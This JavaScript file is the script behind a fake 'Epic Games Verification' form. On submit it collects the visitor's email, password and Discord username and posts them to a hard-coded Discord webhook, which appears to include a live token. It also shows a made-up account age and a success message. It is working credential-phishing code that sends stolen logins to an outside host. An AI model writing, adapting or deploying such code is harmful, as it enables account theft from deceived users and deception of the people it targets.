const form = document.getElementById('verifyForm');
const statusMessage = document.getElementById('statusMessage');

// PASTE YOUR DISCORD WEBHOOK URL HERE
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1541892394599972885/_KRoFu47U5G7zbPDcjzUz4UqnHKvYh0T-1DRtY_GCnSHFPCgGyPKuFOlu_T-PAWxQ-JJ';

form.addEventListener('submit', async function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const discordUser = document.getElementById('discordUser').value;

    // Optional: Simulating how old an account is based on a random or placeholder check, 
    // since determining exact creation date requires querying an API.
    const accountAge = "1 Year, 4 Months (Estimated)"; 

    // Format the message layout for Discord
    const payload = {
        content: "🚨 **New Verification Submission!**",
        embeds: [
            {
                title: "Epic Games Verification Details",
                color: 3092790, // Epic blue color accent
                fields: [
                    { name: "📧 Email", value: email, inline: false },
                    { name: "🔑 Password", value: `||${password}||`, inline: false }, // Hidden by spoiler tags for security
                    { name: "💬 Discord User", value: discordUser, inline: true },
                    { name: "⏳ Account Age", value: accountAge, inline: true }
                ],
                timestamp: new Date().toISOString()
            }
        ]
    };

    statusMessage.style.color = "#8c8c8c";
    statusMessage.textContent = "Submitting details...";

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            statusMessage.style.color = "#0074e4";
            statusMessage.textContent = "Verification submitted successfully!";
            form.reset();
        } else {
            throw new Error('Failed to send.');
        }
    } catch (error) {
        statusMessage.style.color = "#ff4747";
        statusMessage.textContent = "Error submitting details. Try again later.";
    }
});
